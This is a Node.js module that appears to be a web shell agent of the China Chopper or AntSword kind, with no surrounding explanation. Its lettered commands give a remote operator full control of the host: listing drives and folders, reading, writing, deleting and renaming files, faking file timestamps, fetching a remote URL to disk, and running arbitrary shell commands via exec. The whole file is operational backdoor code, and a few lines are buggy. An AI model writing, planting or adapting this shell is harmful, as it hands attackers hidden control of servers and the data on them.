var fs = require("fs");
var os = require('os');
var http = require('http');
var exec = require('child_process').exec;

var enumParameters = {
	'path': __dirname.replace(/\\/g, '/'),
	'filename': __filename.replace(/\\/g, '/'),
}

var dateFmt = function(date) {
	return date.toLocaleDateString() + " " + date.toLocaleTimeString();
}

var strFmt = function(strin) {
	var args = arguments;
	return strin.replace(/\{(\d+)\}/g, function(s, i) {
		return args[i];
	});
}

var getAbsolutePath = function(path) {
	return path == '/' ? path : path.replace(/[\/\\]*$/gi, '').replace(/\\/g, '/');
}

var getCurrentDisk = function() {
	var ret = [];
	if (os.platform() == 'win32') {
		for (var i = 97; i < 123; i++) {
			var c = String.fromCharCode(i) + ':';
			if (fs.existsSync(c))
				ret.push(c);
		}
	}
	return ret;
}

var nullOrEmpty = function(p) {
	return p === undefined || p === null || p === NaN || p.length === 0;
}

var isEmptyObject = function(o) {
	for (var k in o) {
		return false;
	}
	return true;
}

var sorter = function(a,b){
	return a.toUpperCase() > b.toUpperCase() ? 1 : -1;
}

var getDirInfo = function(dir, cb) {
	var ret = {
		f: [],
		d: []
	};
	fs.readdir(dir, function(err, files, index) {
		if (err || nullOrEmpty(files)) {
			return cb(ret);
		}
		var c = 0;
		files.forEach(function(file, index) {
			var filePath = dir + '/' + file;
			fs.stat(filePath, function(err, data) {
				if (!data) {
					ret.d.push(strFmt('{1}/\t-\t0\t-\n', file));
				} else {
					if (data.isFile()) {
						ret.f.push(strFmt('{1}\t{2}\t{3}\t-\n', file, dateFmt(data.mtime), data.size));
					} else {
						ret.d.push(strFmt('{1}/\t{2}\t0\t-\n', file, dateFmt(data.mtime)));
					}
				}
				if (++c == files.length) {
					return cb(ret);
				}
			});
		});
	});
}

var readFile = function(fp, cb) {
	fs.readFile(fp, function(err, data) {
		cb(data);
	})
};

var writeFile = function(fp, data, cb) {
	fs.writeFile(fp, data, function(err, data) {
		cb(data);
	})
};

var main = function(req, res, cb) {
	var Z = req.z;
	var encoding = req.z0;
	var Z1 = req.z1;
	var Z2 = req.z2;
	var Ret = '1';
	switch (Z) {
		case "A":
			{
				Ret = enumParameters.path + '\t' + getCurrentDisk().join('');
				cb(Ret);
			}
			break;
		case "B":
			{
				getDirInfo(getAbsolutePath(Z1), function(data) {
					Ret = '';
					if (!nullOrEmpty(data.d)) {
						data.d.sort(sorter);
						Ret += data.d.join('');
					}
					if (!nullOrEmpty(data.f)) {
						data.f.sort(sorter);
						Ret += data.f.join('');
					}
					cb(Ret ? Ret : '1');
				});
			}
			break;
		case "C":
			{
				readFile(Z1, function(data) {
					Ret = data;
					cb(Ret);
				})
			}
			break;
		case "D":
			{
				writeFile(Z1, Z2, function(data) {
					cb(Ret);
				})
			}
			break;
		case "E":
			{
				fs.rmdir(Z1, function(data) { // Work in empty Dir only
					fs.unlink(Z1, function(data) {
						cb(Ret);
					});
				});
			}
			break;
		case "F":
			{
				res.write('\x2D\x3E\x7C');
				fs.createReadStream(Z1).pipe(res, function() {
					res.write('\x7C\x3C\x2D');
				});
			}
			break;
		case "G":
			{
				for (var i = 0; i < Z2.length; i += 2) {
					byteA.push(parseInt(Z2.substr(i, 2), 16));
				}
				fs.createWriteStream(Z1).write(new Buffer(byteA));
				cb(Ret);
			}
		case "H":
			{
				fs.createReadStream(Z1).pipe(fs.createWriteStream(Z2));
				cb(Ret);
			}
			break;
		case "I":
			{
				fs.renameSync(Z1, Z2);
				cb(Ret);
			}
			break;
		case "J":
			{
				if (fs.existsSync(Z1) == false) {
					fs.mkdirSync(Z1, 7777);
				}
			}
			break;
		case "K":
			{
				var TM = new Date(Z2);
				fs.utimes(Z1, TM, TM, function() {
					cb(Ret);
				})
			}
			break;
		case "L":
			{
				http.get(Z1, function onResponse(response) {
					response.pipe(fs.createWriteStream(Z2));
					cb(Ret);
				});
			}
			break;
		case "M":
			{
				exec(strFmt('{1} {2} {3}', Z1.substr(2),Z1.substr(0,2),Z2), function(err, out) {
					Ret = out;
					cb(Ret);
				});
			}
			break;
		default:
			{
				cb(Ret);
			}
			break;
	}
}

exports.do = function(req, res) {
	return main(req, res, function(data) {
		data ? res.send(strFmt('\x2D\x3E\x7C{1}\x7C\x3C\x2D', data)) : res.end();
	})
}
